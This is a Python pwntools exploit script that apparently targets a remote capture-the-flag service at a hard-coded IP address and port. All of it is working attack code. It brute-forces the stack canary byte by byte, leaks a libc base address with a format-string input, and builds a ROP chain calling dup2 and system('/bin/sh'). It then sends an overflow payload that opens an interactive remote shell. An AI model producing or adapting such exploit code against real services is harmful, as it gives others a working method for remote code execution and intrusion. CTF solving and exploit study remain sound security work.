from pwn import *

libc = context.binary = ELF("libc.so.6")

host = '94.237.55.128'
port = 46734


def start():
    return remote(host, port)


def brute_force_canary():
    canary = b'\x00'
    print("[+] Brute-forcing the canary...")
    for i in range(7):
        for byte in range(256):
            test_canary = canary + bytes([byte])
            io = start()
            io.sendlineafter(b'=> ', b'A')
            io.sendlineafter(b'=> ', b'1')
            io.sendlineafter(b'=> ', b'4')
            io.sendlineafter(b'=> ', b'2')
            io.sendlineafter(b'=> ', b'A' * 255)
            io.sendlineafter(b'=> ', b'y')
            io.sendafter(b'=> ', b'A' * 8 + test_canary)
            try:
                response = io.recvline(timeout=1)
                response = io.recvline(timeout=1)
                response = io.recvline(timeout=1)
                if response:
                    canary += bytes([byte])
                    print(
                        f"[+] Byte {i+1} found: {hex(byte)} â†’ Current canary: {canary.hex()}")
                    io.close()
                    break
            except EOFError:
                print(f"[-] Byte {hex(byte)} is invalid, retrying...")
                io.close()
            print(f"[-] Current canary: {canary.hex()}")
    print(f"[+] Complete canary found: {canary.hex()}")
    return canary


def leak_libc():
    io = start()
    io.sendlineafter(b'=> ', b'a' * 0x10)
    io.sendlineafter(b'=> ', b'1')
    io.sendlineafter(b'=> ', b'%2$p')
    io.close()

    io = start()
    io.sendlineafter(b'=> ', b'a' * 0x10)
    io.sendlineafter(b'=> ', b'5')
    io.recvuntil(b'Table for ')
    libc_base = int(io.recv(14).decode(), 16) - (libc.sym['lseek64'] + 11)
    io.close()
    print(f"[+] Libc base address: {hex(libc_base)}")
    return libc_base


def exploit():
    libc.address = leak_libc()
    print(f"[DEBUG] Using libc base: {hex(libc.address)}")

    canary = brute_force_canary()
    print(f"[DEBUG] Using canary: {canary.hex()}")

    rop = ROP(libc)

    sockfd = 4
    for fd in range(3):  # stdin, stdout, stderr
        rop.call(libc.sym['dup2'], [sockfd, fd])

    rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])

    payload = b"A" * 8 + canary + p64(0) + rop.chain()
    print(f"[DEBUG] Payload: {payload.hex()}")

    io = start()
    io.sendlineafter(b'=> ', b'notagain')
    io.sendlineafter(b'=> ', b'1')
    io.sendlineafter(b'=> ', b'4')
    io.sendlineafter(b'=> ', b'2')
    io.sendlineafter(b'=> ', b'a' * 255)
    io.sendlineafter(b'=> ', b'y')
    io.sendafter(b'=> ', payload)
    io.interactive()


exploit()
